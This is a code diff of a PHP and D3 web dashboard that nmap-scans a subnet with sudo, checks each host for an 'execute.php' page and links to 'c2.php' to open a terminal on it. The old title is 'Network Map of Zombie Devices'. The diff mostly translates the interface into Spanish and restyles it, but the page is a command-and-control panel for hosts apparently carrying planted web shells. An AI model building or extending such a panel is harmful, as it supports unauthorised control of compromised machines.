@@ -6,9 +6,6 @@ if (!isset($_SESSION['user'])) {
     exit;
 }
 
-// Obtener la IP del cliente
-$user_ip = $_SERVER['REMOTE_ADDR'];
-
 // Ejecutar el comando Nmap
 $command = "sudo nmap 172.17.0.1/24 -O -n 2>&1";
 $output = [];
@@ -45,12 +42,6 @@ foreach ($hosts as &$host) {
     $url = "http://" . $host['ip'] . "/execute.php";
     $headers = @get_headers($url);
     $host['has_execute'] = $headers && strpos($headers[0], '200') !== false;
-    // Añadir indicador para el cliente
-    if ($host['ip'] === $user_ip) {
-        $host['is_user'] = true;
-    } else {
-        $host['is_user'] = false;
-    }
 }
 ?>
 
@@ -59,9 +50,9 @@ foreach ($hosts as &$host) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard</title>
+    <title>Mapa de Red Interactivo</title>
+    <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
     <script src="https://d3js.org/d3.v7.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <style>
         body {
             background-color: #0d0d0d;
@@ -71,25 +62,23 @@ foreach ($hosts as &$host) {
             padding: 0;
         }
 
-        #particles-js {
-            position: fixed;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            top: 0;
-            left: 0;
-        }
-
         h1 {
             text-align: center;
             color: #00cc00;
             margin-top: 20px;
         }
 
-        svg {
+        #particles-js {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        #network {
             display: block;
             margin: 0 auto;
-            background-color: #001a00;
+            background-color: rgba(0, 26, 0, 1); /* Opaco */
             border: 1px solid #00ff00;
         }
 
@@ -102,16 +91,7 @@ foreach ($hosts as &$host) {
             fill: #004d00;
             stroke: #00ff00;
             stroke-width: 2px;
-        }
-
-        .node.red circle {
-            fill: #660000;
-            stroke: #ff0000;
-        }
-
-        .node.you circle {
-            fill: #000066;
-            stroke: #0000ff;
+            cursor: grab;
         }
 
         .node circle:hover {
@@ -147,40 +127,28 @@ foreach ($hosts as &$host) {
 </head>
 <body>
     <div id="particles-js"></div>
-    <h1>Network Map of Zombie Devices</h1>
+
+    <h1>Mapa de Red Interactivo</h1>
     <svg id="network" width="800" height="300"></svg>
     <div id="details" class="details" style="display: none;">
-        <h2>Host Info</h2>
+        <h2>Información del Host</h2>
         <p><strong>IP:</strong> <span id="ip"></span></p>
-        <p><strong>OS:</strong> <span id="os"></span></p>
-        <p><strong>Open Ports:</strong></p>
+        <p><strong>Sistema Operativo:</strong> <span id="os"></span></p>
+        <p><strong>Puertos Abiertos:</strong></p>
         <ul id="ports"></ul>
         <p id="execute"></p>
     </div>
 
     <script>
         // Inicializar Particles.js
-        particlesJS("particles-js", {
-            particles: {
-                number: { value: 100 },
-                color: { value: "#00ff00" },
-                shape: { type: "circle" },
-                opacity: { value: 0.5 },
-                size: { value: 3 },
-                line_linked: {
-                    enable: true,
-                    distance: 150,
-                    color: "#00ff00",
-                    opacity: 0.4,
-                    width: 1
-                },
-                move: { enable: true, speed: 2 }
-            }
+        particlesJS.load('particles-js', 'https://cdn.jsdelivr.net/gh/VincentGarreau/particles.js/particles.json', function() {
+            console.log('Particles.js configurado correctamente.');
         });
 
         // Datos PHP convertidos a JavaScript
         const hosts = <?= json_encode($hosts) ?>;
 
+        // Configuración del gráfico
         const width = 800;
         const height = 300;
 
@@ -188,18 +156,20 @@ foreach ($hosts as &$host) {
         const simulation = d3.forceSimulation()
             .force("link", d3.forceLink().id(d => d.ip))
             .force("charge", d3.forceManyBody().strength(-200))
-            .force("center", d3.forceCenter(width / 2, height / 2));
+            .force("center", d3.forceCenter(width / 2, height / 2))
+            .force("collision", d3.forceCollide().radius(20));
 
+        // Convertir hosts a nodos y links
         const nodes = hosts.map(host => ({
             ...host,
             id: host.ip
         }));
-
-        const links = nodes.map(node => ({
-            source: nodes[0].ip,
+        const links = nodes.map((node, i) => ({
+            source: nodes[0].ip, // Conectar todos al primer nodo
             target: node.ip
         }));
 
+        // Crear links
         const link = svg.append("g")
             .attr("stroke", "#00ff00")
             .attr("stroke-width", 1.5)
@@ -208,6 +178,7 @@ foreach ($hosts as &$host) {
             .enter()
             .append("line");
 
+        // Crear nodos
         const node = svg.append("g")
             .attr("stroke", "#003300")
             .attr("stroke-width", 1.5)
@@ -215,34 +186,40 @@ foreach ($hosts as &$host) {
             .data(nodes)
             .enter()
             .append("g")
-            .attr("class", d => d.is_user ? "node you" : (d.ports.some(port => port.includes("80/tcp")) && d.has_execute ? "node red" : "node"))
+            .attr("class", "node")
+            .call(d3.drag()
+                .on("start", dragStarted)
+                .on("drag", dragged)
+                .on("end", dragEnded))
             .on("click", showDetails);
 
-        node.append("circle").attr("r", 10);
+        node.append("circle")
+            .attr("r", 10);
 
         node.append("text")
-            .text(d => d.is_user ? `${d.ip} (YOU)` : d.ip)
+            .text(d => d.ip)
             .attr("x", 12)
             .attr("y", 3);
 
-        node.call(d3.drag()
-            .on("start", dragstarted)
-            .on("drag", dragged)
-            .on("end", dragended));
+        // Simulación de fuerzas
+        simulation
+            .nodes(nodes)
+            .on("tick", () => {
+                link
+                    .attr("x1", d => d.source.x)
+                    .attr("y1", d => d.source.y)
+                    .attr("x2", d => d.target.x)
+                    .attr("y2", d => d.target.y);
 
-        simulation.nodes(nodes).on("tick", () => {
-            link
-                .attr("x1", d => d.source.x)
-                .attr("y1", d => d.source.y)
-                .attr("x2", d => d.target.x)
-                .attr("y2", d => d.target.y);
+                node
+                    .attr("transform", d => `translate(${d.x},${d.y})`);
+            });
 
-            node.attr("transform", d => `translate(${d.x},${d.y})`);
-        });
+        simulation.force("link")
+            .links(links);
 
-        simulation.force("link").links(links);
-
-        function dragstarted(event, d) {
+        // Funciones de arrastre
+        function dragStarted(event, d) {
             if (!event.active) simulation.alphaTarget(0.3).restart();
             d.fx = d.x;
             d.fy = d.y;
@@ -253,12 +230,13 @@ foreach ($hosts as &$host) {
             d.fy = event.y;
         }
 
-        function dragended(event, d) {
+        function dragEnded(event, d) {
             if (!event.active) simulation.alphaTarget(0);
             d.fx = null;
             d.fy = null;
         }
 
+        // Mostrar detalles al hacer clic en un nodo
         function showDetails(event, d) {
             const details = document.getElementById("details");
             document.getElementById("ip").textContent = d.ip;
@@ -274,9 +252,9 @@ foreach ($hosts as &$host) {
 
             const execute = document.getElementById("execute");
             if (d.has_execute) {
-                execute.innerHTML = `<a href="c2.php?ip=${d.ip}" target="_blank">Open Terminal</a>`;
+                execute.innerHTML = `<a href="c2.php?ip=${d.ip}" target="_blank">Abrir execute.php</a>`;
             } else {
-                execute.textContent = "Terminal not available";
+                execute.textContent = "execute.php no disponible";
             }
 
             details.style.display = "block";
